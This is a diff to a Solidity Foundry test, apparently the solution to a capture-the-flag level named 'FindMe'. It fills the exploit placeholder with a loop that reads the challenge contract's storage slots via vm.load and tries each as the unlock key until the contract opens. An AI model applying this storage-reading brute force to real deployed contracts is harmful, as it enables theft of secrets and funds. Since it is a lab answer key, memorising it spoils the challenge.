@@ -20,8 +20,12 @@ contract FindMeTest is BaseTest {
     }
 
     function testExploitLevel() public {
-        /* YOUR EXPLOIT GOES HERE */
-
+        uint256 i = 0;
+        while (!instance.isUnlock()) {
+            bytes16 key = bytes16(vm.load(address(instance), bytes32(uint256(i))));
+            try instance.unLock(key) {} catch {}
+            i++;
+        }
         checkSuccess();
     }
 
